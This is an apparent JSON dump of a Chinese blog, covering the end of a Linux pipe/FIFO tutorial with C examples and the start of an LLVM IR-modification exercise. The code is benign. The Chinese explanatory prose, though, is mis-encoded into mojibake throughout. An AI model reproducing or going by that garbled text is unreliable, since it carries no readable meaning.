if (write(pipefd[1], STRING, strlen(STRING)) &lt; 0) &#123; perror(\"write()\"); exit(1); &#125; if (read(pipefd[0], buf, BUFSIZ) &lt; 0) &#123; perror(\"write()\"); exit(1); &#125; printf(\"%s\\n\", buf); exit(0); &#125; è¿™ä¸ªç¨‹åºåˆ›å»ºäº†ä¸€ä¸ªç®¡é“ï¼Œå¹¶ä¸”å¯¹ç®¡é“å†™äº†ä¸€ä¸ªå­—ç¬¦ä¸²ä¹‹åä»ç®¡é“è¯»å–ï¼Œå¹¶æ‰“å°åœ¨æ ‡å‡†è¾“å‡ºä¸Šã€‚ç”¨ä¸€ä¸ªå›¾æ¥è¯´æ˜è¿™ä¸ªç¨‹åºçš„çŠ¶æ€å°±æ˜¯è¿™æ ·çš„ï¼š ä¸€ä¸ªè¿›ç¨‹è‡ªå·±ç»™è‡ªå·±å‘é€æ¶ˆæ¯è¿™å½“ç„¶ä¸å«è¿›ç¨‹é—´é€šä¿¡ï¼Œæ‰€ä»¥å®é™…æƒ…å†µä¸­æˆ‘ä»¬ä¸ä¼šåœ¨å•ä¸ªè¿›ç¨‹ä¸­ä½¿ç”¨ç®¡é“ã€‚è¿›ç¨‹åœ¨pipeåˆ›å»ºå®Œç®¡é“ä¹‹åï¼Œå¾€å¾€éƒ½è¦forkäº§ç”Ÿå­è¿›ç¨‹ï¼Œæˆä¸ºå¦‚ä¸‹å›¾è¡¨ç¤ºçš„æ ·å­ï¼š å¦‚å›¾ä¸­æè¿°ï¼Œforkäº§ç”Ÿçš„å­è¿›ç¨‹ä¼šç»§æ‰¿çˆ¶è¿›ç¨‹å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦ã€‚åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œçˆ¶è¿›ç¨‹å…ˆpipeåˆ›å»ºç®¡é“ä¹‹åï¼Œå­è¿›ç¨‹ä¹Ÿä¼šå¾—åˆ°åŒä¸€ä¸ªç®¡é“çš„è¯»å†™æ–‡ä»¶æè¿°ç¬¦ã€‚ä»è€Œå®ç°äº†çˆ¶å­ä¸¤ä¸ªè¿›ç¨‹ä½¿ç”¨ä¸€ä¸ªç®¡é“å¯ä»¥å®ŒæˆåŠåŒå·¥é€šä¿¡ã€‚æ­¤æ—¶ï¼Œçˆ¶è¿›ç¨‹å¯ä»¥é€šè¿‡fd[1]ç»™å­è¿›ç¨‹å‘æ¶ˆæ¯ï¼Œå­è¿›ç¨‹é€šè¿‡fd[0]è¯»ã€‚å­è¿›ç¨‹ä¹Ÿå¯ä»¥é€šè¿‡fd[1]ç»™çˆ¶è¿›ç¨‹å‘æ¶ˆæ¯ï¼Œçˆ¶è¿›ç¨‹ç”¨fd[0]è¯»ã€‚ç¨‹åºå®ä¾‹å¦‚ä¸‹ï¼š [zorro@zorro-pc pipe]$ cat pipe_parent_child.c #include &lt;stdlib.h> #include &lt;stdio.h> #include &lt;unistd.h> #include &lt;string.h> #include &lt;sys/types.h> #include &lt;sys/wait.h> #define STRING \"hello world!\" int main() &#123; int pipefd[2]; pid_t pid; char buf[BUFSIZ]; if (pipe(pipefd) == -1) &#123; perror(\"pipe()\"); exit(1); &#125; pid = fork(); if (pid == -1) &#123; perror(\"fork()\"); exit(1); &#125; if (pid == 0) &#123; /* this is child. */ printf(\"Child pid is: %d\\n\", getpid()); if (read(pipefd[0], buf, BUFSIZ) &lt; 0) &#123; perror(\"write()\"); exit(1); &#125; printf(\"%s\\n\", buf); bzero(buf, BUFSIZ); snprintf(buf, BUFSIZ, \"Message from child: My pid is: %d\", getpid()); if (write(pipefd[1], buf, strlen(buf)) &lt; 0) &#123; perror(\"write()\"); exit(1); &#125; &#125; else &#123; /* this is parent */ printf(\"Parent pid is: %d\\n\", getpid()); snprintf(buf, BUFSIZ, \"Message from parent: My pid is: %d\", getpid()); if (write(pipefd[1], buf, strlen(buf)) &lt; 0) &#123; perror(\"write()\"); exit(1); &#125; sleep(1); bzero(buf, BUFSIZ); if (read(pipefd[0], buf, BUFSIZ) &lt; 0) &#123; perror(\"write()\"); exit(1); &#125; printf(\"%s\\n\", buf); wait(NULL); &#125; exit(0); &#125; çˆ¶è¿›ç¨‹å…ˆç»™å­è¿›ç¨‹å‘ä¸€ä¸ªæ¶ˆæ¯ï¼Œå­è¿›ç¨‹æ¥æ”¶åˆ°ä¹‹åæ‰“å°æ¶ˆæ¯ï¼Œä¹‹åå†ç»™çˆ¶è¿›ç¨‹å‘æ¶ˆæ¯ï¼Œçˆ¶è¿›ç¨‹å†æ‰“å°ä»å­è¿›ç¨‹æ¥æ”¶åˆ°çš„æ¶ˆæ¯ã€‚ç¨‹åºæ‰§è¡Œæ•ˆæœï¼š [zorro@zorro-pc pipe]$ ./pipe_parent_child Parent pid is: 8309 Child pid is: 8310 Message from parent: My pid is: 8309 Message from child: My pid is: 8310 ä»è¿™ä¸ªç¨‹åºä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç®¡é“å®é™…ä¸Šå¯ä»¥å®ç°ä¸€ä¸ªåŠåŒå·¥é€šä¿¡çš„æœºåˆ¶ã€‚ä½¿ç”¨åŒä¸€ä¸ªç®¡é“çš„çˆ¶å­è¿›ç¨‹å¯ä»¥åˆ†æ—¶ç»™å¯¹æ–¹å‘é€æ¶ˆæ¯ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°å¯¹ç®¡é“è¯»å†™çš„ä¸€äº›ç‰¹ç‚¹ï¼Œå³ï¼š åœ¨ç®¡é“ä¸­æ²¡æœ‰æ•°æ®çš„æƒ…å†µä¸‹ï¼Œå¯¹ç®¡é“çš„è¯»æ“ä½œä¼šé˜»å¡ï¼Œç›´åˆ°ç®¡é“å†…æœ‰æ•°æ®ä¸ºæ­¢ã€‚å½“ä¸€æ¬¡å†™çš„æ•°æ®é‡ä¸è¶…è¿‡ç®¡é“å®¹é‡çš„æ—¶å€™ï¼Œå¯¹ç®¡é“çš„å†™æ“ä½œä¸€èˆ¬ä¸ä¼šé˜»å¡ï¼Œç›´æ¥å°†è¦å†™çš„æ•°æ®å†™å…¥ç®¡é“ç¼“å†²åŒºå³å¯ã€‚ å½“ç„¶å†™æ“ä½œä¹Ÿä¸ä¼šå†æ‰€æœ‰æƒ…å†µä¸‹éƒ½ä¸é˜»å¡ã€‚è¿™é‡Œæˆ‘ä»¬è¦å…ˆæ¥äº†è§£ä¸€ä¸‹ç®¡é“çš„å†…æ ¸å®ç°ã€‚ä¸Šæ–‡è¯´è¿‡ï¼Œç®¡é“å®é™…ä¸Šå°±æ˜¯å†…æ ¸æ§åˆ¶çš„ä¸€ä¸ªå†…å­˜ç¼“å†²åŒºï¼Œæ—¢ç„¶æ˜¯ç¼“å†²åŒºï¼Œå°±æœ‰å®¹é‡ä¸Šé™ã€‚æˆ‘ä»¬æŠŠç®¡é“ä¸€æ¬¡æœ€å¤šå¯ä»¥ç¼“å­˜çš„æ•°æ®é‡å¤§å°å«åšPIPESIZEã€‚å†…æ ¸åœ¨å¤„ç†ç®¡é“æ•°æ®çš„æ—¶å€™ï¼Œåº•å±‚ä¹Ÿè¦è°ƒç”¨ç±»ä¼¼readå’Œwriteè¿™æ ·çš„æ–¹æ³•è¿›è¡Œæ•°æ®æ‹·è´ï¼Œè¿™ç§å†…æ ¸æ“ä½œæ¯æ¬¡å¯ä»¥æ“ä½œçš„æ•°æ®é‡ä¹Ÿæ˜¯æœ‰é™çš„ï¼Œä¸€èˆ¬çš„æ“ä½œé•¿åº¦ä¸ºä¸€ä¸ªpageï¼Œå³é»˜è®¤ä¸º4kå­—èŠ‚ã€‚æˆ‘ä»¬æŠŠæ¯æ¬¡å¯ä»¥æ“ä½œçš„æ•°æ®é‡é•¿åº¦å«åšPIPEBUFã€‚POSIXæ ‡å‡†ä¸­ï¼Œå¯¹PIPEBUFæœ‰é•¿åº¦é™åˆ¶ï¼Œè¦æ±‚å…¶æœ€å°é•¿åº¦ä¸å¾—ä½äº512å­—èŠ‚ã€‚PIPEBUFçš„ä½œç”¨æ˜¯ï¼Œå†…æ ¸åœ¨å¤„ç†ç®¡é“çš„æ—¶å€™ï¼Œå¦‚æœæ¯æ¬¡è¯»å†™æ“ä½œçš„æ•°æ®é•¿åº¦ä¸å¤§äºPIPEBUFæ—¶ï¼Œä¿è¯å…¶æ“ä½œæ˜¯åŸå­çš„ã€‚è€ŒPIPESIZEçš„å½±å“æ˜¯ï¼Œå¤§äºå…¶é•¿åº¦çš„å†™æ“ä½œä¼šè¢«é˜»å¡ï¼Œç›´åˆ°å½“å‰ç®¡é“ä¸­çš„æ•°æ®è¢«è¯»å–ä¸ºæ­¢ã€‚ åœ¨Linux 2.6.11ä¹‹å‰ï¼ŒPIPESIZEå’ŒPIPEBUFå®é™…ä¸Šæ˜¯ä¸€æ ·çš„ã€‚åœ¨è¿™ä¹‹åï¼ŒLinuxé‡æ–°å®ç°äº†ä¸€ä¸ªç®¡é“ç¼“å­˜ï¼Œå¹¶å°†å®ƒä¸å†™æ“ä½œçš„PIPEBUFå®ç°æˆäº†ä¸åŒçš„æ¦‚å¿µï¼Œå½¢æˆäº†ä¸€ä¸ªé»˜è®¤é•¿åº¦ä¸º65536å­—èŠ‚çš„PIPESIZEï¼Œè€ŒPIPEBUFåªå½±å“ç›¸å…³è¯»å†™æ“ä½œçš„åŸå­æ€§ã€‚ä»Linux 2.6.35ä¹‹åï¼Œåœ¨fcntlç³»ç»Ÿè°ƒç”¨æ–¹æ³•ä¸­å®ç°äº†F_GETPIPE_SZå’ŒF_SETPIPE_SZæ“ä½œï¼Œæ¥åˆ†åˆ«æŸ¥çœ‹å½“å‰ç®¡é“å®¹é‡å’Œè®¾ç½®ç®¡é“å®¹é‡ã€‚ç®¡é“å®¹é‡å®¹é‡ä¸Šé™å¯ä»¥åœ¨/proc/sys/fs/pipe-max-sizeè¿›è¡Œè®¾ç½®ã€‚ #define BUFSIZE 65536 ...... ret = fcntl(pipefd[1], F_GETPIPE_SZ); if (ret &lt; 0) &#123; perror(\"fcntl()\"); exit(1); &#125; printf(\"PIPESIZE: %d\\n\", ret); ret = fcntl(pipefd[1], F_SETPIPE_SZ, BUFSIZE); if (ret &lt; 0) &#123; perror(\"fcntl()\"); exit(1); &#125; ...... PIPEBUFå’ŒPIPESIZEå¯¹ç®¡é“æ“ä½œçš„å½±å“ä¼šå› ä¸ºç®¡é“æè¿°ç¬¦æ˜¯å¦è¢«è®¾ç½®ä¸ºéé˜»å¡æ–¹å¼è€Œæœ‰è¡Œä¸ºå˜åŒ–ï¼Œnä¸ºè¦å†™å…¥çš„æ•°æ®é‡æ—¶å…·ä½“ä¸ºï¼š O_NONBLOCKå…³é—­ï¼Œn &lt;= PIPE_BUFï¼š nä¸ªå­—èŠ‚çš„å†™å…¥æ“ä½œæ˜¯åŸå­æ“ä½œï¼Œwriteç³»ç»Ÿè°ƒç”¨å¯èƒ½ä¼šå› ä¸ºç®¡é“å®¹é‡(PIPESIZE)æ²¡æœ‰è¶³å¤Ÿçš„ç©ºé—´å­˜æ”¾nå­—èŠ‚é•¿åº¦è€Œé˜»å¡ã€‚ O_NONBLOCKæ‰“å¼€ï¼Œn &lt;= PIPE_BUFï¼š å¦‚æœæœ‰è¶³å¤Ÿçš„ç©ºé—´å­˜æ”¾nå­—èŠ‚é•¿åº¦ï¼Œwriteè°ƒç”¨ä¼šç«‹å³è¿”å›æˆåŠŸï¼Œå¹¶ä¸”å¯¹æ•°æ®è¿›è¡Œå†™æ“ä½œã€‚ç©ºé—´ä¸å¤Ÿåˆ™ç«‹å³æŠ¥é”™è¿”å›ï¼Œå¹¶ä¸”errnoè¢«è®¾ç½®ä¸ºEAGAINã€‚ O_NONBLOCKå…³é—­ï¼Œn &gt; PIPE_BUFï¼š å¯¹nå­—èŠ‚çš„å†™å…¥æ“ä½œä¸ä¿è¯æ˜¯åŸå­çš„ï¼Œå°±æ˜¯è¯´è¿™æ¬¡å†™å…¥æ“ä½œçš„æ•°æ®å¯èƒ½ä¼šè·Ÿå…¶ä»–è¿›ç¨‹å†™è¿™ä¸ªç®¡é“çš„æ•°æ®è¿›è¡Œäº¤å‰ã€‚å½“ç®¡é“å®¹é‡é•¿åº¦ä½äºè¦å†™çš„æ•°æ®é•¿åº¦çš„æ—¶å€™writeæ“ä½œä¼šè¢«é˜»å¡ã€‚ O_NONBLOCKæ‰“å¼€ï¼Œn &gt; PIPE_BUFï¼š å¦‚æœç®¡é“ç©ºé—´å·²æ»¡ã€‚writeè°ƒç”¨æŠ¥é”™è¿”å›å¹¶ä¸”errnoè¢«è®¾ç½®ä¸ºEAGAINã€‚å¦‚æœæ²¡æ»¡ï¼Œåˆ™å¯èƒ½ä¼šå†™å…¥ä»1åˆ°nä¸ªå­—èŠ‚é•¿åº¦ï¼Œè¿™å–å†³äºå½“å‰ç®¡é“çš„å‰©ä½™ç©ºé—´é•¿åº¦ï¼Œå¹¶ä¸”è¿™äº›æ•°æ®å¯èƒ½è·Ÿåˆ«çš„è¿›ç¨‹çš„æ•°æ®æœ‰äº¤å‰ã€‚ ä»¥ä¸Šæ˜¯åœ¨ä½¿ç”¨åŠåŒå·¥ç®¡é“çš„æ—¶å€™è¦æ³¨æ„çš„äº‹æƒ…ï¼Œå› ä¸ºåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç®¡é“çš„ä¸¤ç«¯éƒ½å¯èƒ½æœ‰å¤šä¸ªè¿›ç¨‹è¿›è¡Œè¯»å†™å¤„ç†ã€‚å¦‚æœå†åŠ ä¸Šçº¿ç¨‹ï¼Œåˆ™äº‹æƒ…å¯èƒ½å˜å¾—æ›´å¤æ‚ã€‚å®é™…ä¸Šï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨ç®¡é“çš„æ—¶å€™ï¼Œå¹¶ä¸æ¨èè¿™æ ·æ¥ç”¨ã€‚ç®¡é“æ¨èçš„ä½¿ç”¨æ–¹æ³•æ˜¯å…¶å•å·¥æ¨¡å¼ï¼šå³åªæœ‰ä¸¤ä¸ªè¿›ç¨‹é€šä¿¡ï¼Œä¸€ä¸ªè¿›ç¨‹åªå†™ç®¡é“ï¼Œå¦ä¸€ä¸ªè¿›ç¨‹åªè¯»ç®¡é“ã€‚å®ç°ä¸ºï¼š [zorro@zorro-pc pipe]$ cat pipe_parent_child2.c #include &lt;stdlib.h> #include &lt;stdio.h> #include &lt;unistd.h> #include &lt;string.h> #include &lt;sys/types.h> #include &lt;sys/wait.h> #define STRING \"hello world!\" int main() &#123; int pipefd[2]; pid_t pid; char buf[BUFSIZ]; if (pipe(pipefd) == -1) &#123; perror(\"pipe()\"); exit(1); &#125; pid = fork(); if (pid == -1) &#123; perror(\"fork()\"); exit(1); &#125; if (pid == 0) &#123; /* this is child. */ close(pipefd[1]); printf(\"Child pid is: %d\\n\", getpid()); if (read(pipefd[0], buf, BUFSIZ) &lt; 0) &#123; perror(\"write()\"); exit(1); &#125; printf(\"%s\\n\", buf); &#125; else &#123; /* this is parent */ close(pipefd[0]); printf(\"Parent pid is: %d\\n\", getpid()); snprintf(buf, BUFSIZ, \"Message from parent: My pid is: %d\", getpid()); if (write(pipefd[1], buf, strlen(buf)) &lt; 0) &#123; perror(\"write()\"); exit(1); &#125; wait(NULL); &#125; exit(0); &#125; è¿™ä¸ªç¨‹åºå®é™…ä¸Šæ¯”ä¸Šä¸€ä¸ªè¦ç®€å•ï¼Œçˆ¶è¿›ç¨‹å…³é—­ç®¡é“çš„è¯»ç«¯ï¼Œåªå†™ç®¡é“ã€‚å­è¿›ç¨‹å…³é—­ç®¡é“çš„å†™ç«¯ï¼Œåªè¯»ç®¡é“ã€‚æ•´ä¸ªç®¡é“çš„æ‰“å¼€æ•ˆæœæœ€åæˆä¸ºä¸‹å›¾æ‰€ç¤ºï¼š æ­¤æ—¶ä¸¤ä¸ªè¿›ç¨‹å°±åªç”¨ç®¡é“å®ç°äº†ä¸€ä¸ªå•å·¥é€šä¿¡ï¼Œå¹¶ä¸”è¿™ç§çŠ¶æ€ä¸‹ä¸ç”¨è€ƒè™‘å¤šä¸ªè¿›ç¨‹åŒæ—¶å¯¹ç®¡é“å†™äº§ç”Ÿçš„æ•°æ®äº¤å‰çš„é—®é¢˜ï¼Œè¿™æ˜¯æœ€ç»å…¸çš„ç®¡é“æ‰“å¼€æ–¹å¼ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬æ¨èçš„ç®¡é“ä½¿ç”¨æ–¹å¼ã€‚å¦å¤–ï¼Œä½œä¸ºä¸€ä¸ªç¨‹åºå‘˜ï¼Œå³ä½¿æˆ‘ä»¬äº†è§£äº†Linuxç®¡é“çš„å®ç°ï¼Œæˆ‘ä»¬çš„ä»£ç ä¹Ÿä¸èƒ½ä¾èµ–å…¶ç‰¹æ€§ï¼Œæ‰€ä»¥å¤„ç†ç®¡é“æ—¶è¯¥è¶Šç•Œåˆ¤æ–­è¿˜æ˜¯è¦åˆ¤æ–­ï¼Œè¯¥é”™è¯¯æ£€æŸ¥è¿˜æ˜¯è¦æ£€æŸ¥ï¼Œè¿™æ ·ä»£ç æ‰èƒ½æ›´å¥å£®ã€‚ FIFO å‘½åç®¡é“åœ¨åº•å±‚çš„å®ç°è·ŸåŒ¿åç®¡é“å®Œå…¨ä¸€è‡´ï¼ŒåŒºåˆ«åªæ˜¯å‘½åç®¡é“ä¼šæœ‰ä¸€ä¸ªå…¨å±€å¯è§çš„æ–‡ä»¶åä»¥ä¾›åˆ«äººopenæ‰“å¼€ä½¿ç”¨ã€‚å†ç¨‹åºä¸­åˆ›å»ºä¸€ä¸ªå‘½åç®¡é“æ–‡ä»¶çš„æ–¹æ³•æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯ä½¿ç”¨mkfifoå‡½æ•°ã€‚å¦ä¸€ç§æ˜¯ä½¿ç”¨mknodç³»ç»Ÿè°ƒç”¨ï¼Œä¾‹å­å¦‚ä¸‹ï¼š [zorro@zorro-pc pipe]$ cat mymkfifo.c #include &lt;stdio.h> #include &lt;sys/types.h> #include &lt;sys/stat.h> #include &lt;stdlib.h> int main(int argc, char *argv[]) &#123; if (argc != 2) &#123; fprintf(stderr, \"Argument error!\\n\"); exit(1); &#125; /* if (mkfifo(argv[1], 0600) &lt; 0) &#123; perror(\"mkfifo()\"); exit(1); &#125; */ if (mknod(argv[1], 0600|S_IFIFO, 0) &lt; 0) &#123; perror(\"mknod()\"); exit(1); &#125; exit(0); &#125; æˆ‘ä»¬ä½¿ç”¨ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºåˆ›å»ºçš„æ–‡ä»¶è·¯å¾„ã€‚åˆ›å»ºå®Œä¹‹åï¼Œå…¶ä»–è¿›ç¨‹å°±å¯ä»¥ä½¿ç”¨open()ã€read()ã€write()æ ‡å‡†æ–‡ä»¶æ“ä½œç­‰æ–¹æ³•è¿›è¡Œä½¿ç”¨äº†ã€‚å…¶ä½™æ‰€æœ‰çš„æ“ä½œè·ŸåŒ¿åç®¡é“ä½¿ç”¨ç±»ä¼¼ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ— è®ºå‘½åè¿˜æ˜¯åŒ¿åç®¡é“ï¼Œå®ƒçš„æ–‡ä»¶æè¿°éƒ½æ²¡æœ‰åç§»é‡çš„æ¦‚å¿µï¼Œæ‰€ä»¥ä¸èƒ½ç”¨lseekè¿›è¡Œåç§»é‡è°ƒæ•´ã€‚ å…³äºç®¡é“çš„å…¶å®ƒè®®é¢˜ï¼Œæ¯”å¦‚popenã€pcloseçš„ä½¿ç”¨ç­‰è¯é¢˜ï¼Œã€ŠUNIXç¯å¢ƒé«˜çº§ç¼–ç¨‹ã€‹ä¸­çš„ç›¸å…³ç« èŠ‚å·²ç»è®²çš„å¾ˆæ¸…æ¥šäº†ã€‚å¦‚æœæƒ³å­¦ä¹ è¡¥å……è¿™äº›çŸ¥è¯†ï¼Œè¯·å‚è§æ­¤ä¹¦ã€‚","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Linux","slug":"æŠ€æœ¯å‘/Linux","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.sizaif.com/tags/Linux/"},{"name":"ç®¡é“","slug":"ç®¡é“","permalink":"https://www.sizaif.com/tags/%E7%AE%A1%E9%81%93/"}],"author":"sizaif"},{"title":"LLVM -Learn-Work3","slug":"LLVM-Learn-Work3","date":"2022-05-03T14:10:28.000Z","updated":"2022-05-25T07:39:06.367Z","comments":true,"path":"posts/4ebd022f/","link":"","permalink":"https://www.sizaif.com/posts/4ebd022f/","excerpt":"","text":"LLVM -Learn-Work3 @2022-05-03 18:54:36 @sizaif Work3ï¼šæ’å…¥ä¸€ä¸ªå‡½æ•°å¹¶è°ƒç”¨ã€‚å‡½æ•°ç”¨äºæ£€æŸ¥åŠ æ³•ç»“æœï¼Œå¦‚æœå¤§äº 100ï¼Œåˆ™å– ä½™ 100ã€‚æ­¤å‡½æ•°ä¼šä¿®æ”¹åŠ æ³•ç»“æœã€‚(å‡½æ•°æ“ä½œ) //main.c #define _GNU_SOURCE #include &lt;stdio.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;stdlib.h> int main() &#123; puts(\"plz input two numbers\"); size_t bufsize = 100; char* buf = malloc(bufsize); getline(&amp;buf, &amp;bufsize, stdin); double f1 = atof(buf); getline(&amp;buf, &amp;bufsize, stdin); double f2 = atof(buf); printf(\"%.2f + %.2f = %.2f \\n\", f1, f2, f1+f2); free(buf); return 0; &#125; ä¸€) æ€è·¯ ç¬¬ä¸€ç§ä¸€ç§æ€è·¯ï¼š åˆ›å»ºä¸€ä¸ªå…¨å±€å˜é‡fdd_res, æ·»åŠ storeæŒ‡ä»¤ï¼Œ å°†faddæŒ‡ä»¤çš„ç»“æœå­˜å‚¨åˆ°å…¨å±€å˜é‡ä¸­ï¼Œ æ„é€ å‡½æ•°ï¼Œè¯»å–å…¨å±€å˜é‡çš„å€¼ï¼Œå¦‚æœå¤§äº100ï¼Œåˆ™å¯¹100å–ä½™ï¼Œå¦åˆ™ä»€ä¹ˆéƒ½ä¸åš ä¿®æ”¹printfå‡½æ•°ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºå…¨å±€å˜é‡fadd_res ç¬¬äºŒç§ä¸€ç§æ€è·¯ï¼š æ„é€ å‡½æ•°work_fnï¼Œå…¶å‡½æ•°ä¼ å‚(fadd)çš„ç»“æœå€¼ å‡½æ•°æ‹¿åˆ°å…¶å€¼ï¼Œåšå–ä½™æ“ä½œï¼Œå¹¶è¿”å›ç»“æœ ä¸»å‡½æ•°å­˜å‚¨work_fnè¿”å›ç»“æœï¼Œå¹¶ä¿®æ”¹printfå‡½æ•°çš„å‚æ•°ã€‚ äºŒ) æ€è·¯ä¸€æ‰§è¡Œ 2.1) è¯»å–IR LLVMContext context; IRBuilder&lt;> builder(context); std::unique_ptr&lt;Module> M; std::unique_ptr&lt;MIRParser> MIR; SMDiagnostic Err; /** * #include \"llvm/IRReader/IRReader.h\" * 2022-04-26 03:04:32 * TODO: * from IR file get Moudle class * */ M = parseIRFile(StringRef(argv[1]),Err,context); if(M)&#123; std::cout&lt;&lt;\"debug: M is not null\"&lt;&lt;std::endl; // M->print(llvm::outs(),nullptr); &#125; else&#123; std::cout&lt;&lt;\"M is null\"&lt;&lt;std::endl; Err.print(argv[0],errs()); &#125; 2.2) æ‰¾åˆ°faddæŒ‡ä»¤ä¸faddåä¸€ä¸ªæŒ‡ä»¤ /** * 2022-04-26 03:25:52 * TODO: * è·å–mainå‡½æ•° * */ auto main_fn = M->getFunction(StringRef(\"main\")); /** * 2022-04-28 02:14:46 * TODO: * æ‰¾åˆ°faddæŒ‡ä»¤,ä¸faddçš„åä¸€ä¸ªæŒ‡ä»¤ * */ Instruction *in_fadd,*in_prt; for (inst_iterator I = inst_begin(*main_fn), E = inst_end(*main_fn); I != E; ++I)&#123; if(I->isBinaryOp() &amp;&amp; I->getOpcode()==Instruction::FAdd)&#123; // outs() &lt;&lt; *I &lt;&lt; \"\\n\"; in_fadd = &amp;*I; in_prt = &amp;*(I.operator++()); &#125; &#125; 2.3) åˆ›å»ºå…¨å±€å˜é‡ï¼Œæ·»åŠ å¿…è¦çš„æŒ‡ä»¤ /** * 2022-04-28 02:42:32 * TODO: * %20 = load double, double* %5, align 8 * %21 = fadd double %19, %20 * 1. åˆ›å»ºå…¨å±€å˜é‡fadd_res * 2. å­˜å…¥å¸¸é‡100 * 3. å°†ADDç»“æœå­˜å…¥å†…å­˜ä¸­ * */ auto f32 = builder.getDoubleTy(); // åˆ›å»ºåˆå§‹å€¼0ä¸100 auto const_100 = ConstantFP::get(f32,double(100)); auto const_0 = ConstantFP::get(f32,double(0)); auto in_alloc02 = new GlobalVariable(*M, f32, false, GlobalValue::PrivateLinkage, const_0, \"fadd_res\"); // è®¾ç½®å¯¹é½æ–¹å¼ in_alloc02->setAlignment(MaybeAlign(8)); // æ’å…¥åŸºæœ¬æŒ‡ä»¤ï¼Œå°†FADDç»“æœ,å­˜åˆ°fadd_resä¸­ builder.SetInsertPoint(in_prt); auto in_alloc01 = builder.CreateAlloca(f32,0,\"ina1\"); auto in_store01 = builder.CreateStore(const_100,in_alloc01); auto in_store02 = builder.CreateStore(in_fadd,in_alloc02); 2.4) æ„é€ å‡½æ•°è¯»å–ç»“æœè¿›è¡Œä¿®æ”¹ /** * 2022-05-03 16:33:58 * TODO: * æ–°å»ºä¸€ä¸ªå‡½æ•°: * void work03_fn()&#123; * if(fdd_res > 100) * fdd_res = fdd_res %100; * &#125; * */ // åˆ›å»ºå‡½æ•° auto fn_prototype = FunctionType::get(builder.getVoidTy(), true); auto work03_fn = Function::Create(fn_prototype, Function::ExternalLinkage, \"work03_fn\", M.get()); // åˆ›å»ºåŸºæœ¬å— auto work03_fn_defaut= BasicBlock::Create(context, \"work03_fn_defaut\", work03_fn); auto work03_fn_change = BasicBlock::Create(context, \"work03_fn_change\", work03_fn); auto work03_fn_nothing = BasicBlock::Create(context, \"work03_fn_nothing\", work03_fn); // é»˜è®¤åŸºæœ¬å— æŒ‡ä»¤æ“ä½œ builder.SetInsertPoint(work03_fn_defaut); auto work03_de_load_01 = builder.CreateLoad(f32,in_alloc02); auto work03_de_fcmp_01 = builder.CreateFCmpUGT(work03_de_load_01,const_100); auto work03_de_br_01 = builder.CreateCondBr(work03_de_fcmp_01, work03_fn_change, work03_fn_nothing); // å–ä½™ æŒ‡ä»¤æ“ä½œ builder.SetInsertPoint(work03_fn_change); auto work03_ch_load_01 = builder.CreateLoad(f32,in_alloc02); auto work03_ch_frem_01 = builder.CreateFRem(work03_ch_load_01,const_100); auto work03_ch_store_01 = builder.CreateStore(work03_ch_frem_01,in_alloc02); builder.CreateRetVoid(); // ç¬¬ä¸‰ä¸ªåŸºæœ¬å—ä»€ä¹ˆéƒ½ä¸åš builder.SetInsertPoint(work03_fn_nothing); builder.CreateRetVoid(); 2.5) ä¿®æ”¹printfå‚æ•° /** * 2022-05-03 18:27:56 * TODO: * åœ¨è°ƒç”¨prtinf å‡½æ•°ä¹‹å‰æ’å…¥è°ƒç”¨å‡½æ•°æŒ‡ä»¤ * ä»¥åŠè¯»å–fadd_res, ä¿®æ”¹printf ç¬¬ä¸‰ä¸ªå‚æ•° * */ builder.SetInsertPoint(in_prt); builder.CreateCall(work03_fn); auto in_load03 = builder.CreateLoad(f32,in_alloc02); in_prt->setOperand(3,in_load03); 2.6) ModuleéªŒè¯ä¸å­˜åˆ°æ–‡ä»¶ /** * #include \"llvm/IR/Verifier.h\" * 2022-05-02 11:43:34 * TODO: * ä¿®æ”¹å®ŒModuleåè¿›è¡ŒéªŒè¯Moduleçš„å®Œæ•´æ€§ * verifyModule(*M,&amp;errs()): true if the module is broken. * */ if(!llvm::verifyModule(*M,&amp;errs()))&#123; outs()&lt;&lt;\"debug: Module verify is ok \\n\"; M->print(outs(),nullptr); &#125; /** * #include \"llvm/Bitcode/BitcodeWriter.h\" * 2022-05-03 12:55:33 * TODO: * å°†ä¿®æ”¹åçš„IR å­˜å‚¨åˆ°æ–‡ä»¶ä¸­ï¼Œ æ‰§è¡Œ * */ std::error_code EC; llvm::raw_fd_ostream OS(\"aftermain.bc\", EC,llvm::sys::fs::OpenFlags()); llvm::WriteBitcodeToFile(*M,OS,true); OS.flush(); 2.7) å…¨éƒ¨æºç  /** * 2022-05-03 16:16:19 * sizaif * Work3ï¼šæ’å…¥ä¸€ä¸ªå‡½æ•°å¹¶è°ƒç”¨ã€‚å‡½æ•°ç”¨äºæ£€æŸ¥åŠ æ³•ç»“æœï¼Œå¦‚æœå¤§äº 100ï¼Œåˆ™å–ä½™ 100ã€‚æ­¤å‡½æ•°ä¼šä¿®æ”¹åŠ æ³•ç»“æœã€‚(å‡½æ•°æ“ä½œ) * clang++ $(llvm-config --cxxflags --ldflags --system-libs --libs) -o main main.cpp * ./main main.ll * lli aftermain.bc * */ #include \"llvm/Transforms/Utils/BasicBlockUtils.h\" #include &lt;llvm/IR/IRBuilder.h> #include \"llvm/IR/LLVMContext.h\" #include \"llvm/IR/Module.h\" #include \"llvm/IR/InstIterator.h\" #include \"llvm/IR/Instruction.h\" #include \"llvm/IR/Instructions.h\" #include \"llvm/IR/InstrTypes.h\" #include \"llvm/IR/Verifier.h\" #include \"llvm/IRReader/IRReader.h\" #include \"llvm/CodeGen/MIRParser/MIRParser.h\" #include \"llvm/Support/InitLLVM.h\" #include \"llvm/Support/Debug.h\" 